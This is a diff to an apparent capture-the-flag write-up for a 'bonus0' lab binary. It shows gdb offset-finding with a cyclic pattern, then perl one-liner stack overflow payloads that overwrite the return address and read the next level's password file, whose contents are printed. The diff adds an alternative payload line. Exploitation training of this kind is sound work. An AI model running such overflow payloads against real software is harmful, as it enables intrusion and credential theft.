@@ -64,9 +64,9 @@ found at offset: 9
 [VM]
 > gdb bonus0
 (gdb) $ run
- - 
+ -
 01234567890123456789
- - 
+ -
 AAA~AAA}AAA|AAA{AAAzAAAyAAAxAAAwAAAvAAAuAAAtAAAsAAArAAAqAAApAAAoAAAnAAAmAAAlAAAkAAAjAAAiAAAhAAAgAAAfAAAeAAAdAAAcAAAbAAAaAAA_AAA^AAA]AAA[AAA@AAA?AAA>AAA=AAA<AAA;AAA:AAA9AAA8AAA7AAA6AAA5AAA4AAA3AAA2AAA1
 (SEGFAULT) => Invalid $PC address: 0x417c4141
 EIP: 0x417c4141 ('AA|A')
@@ -81,6 +81,11 @@ Finally, we need to send the environnement variable with an offset of 9 on the s
 > perl -e 'print "A"x4095 . "\n" . "B"x9 . "\x45\xf8\xff\xbf" . "B"x7 . "\n"' > /tmp/a ; cat /tmp/a - | ./bonus0
 cat /home/user/bonus1/.pass
 cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+```
+
+### Alternative
+```
+(perl -e 'print "A"x4095 . "\n" . "B"x9 . "\x26\xf8\xff\xbf" . "B"x(20 - 9 - 4) . "\n"'; cat) | ./bonus0
 ```
 
 flag:
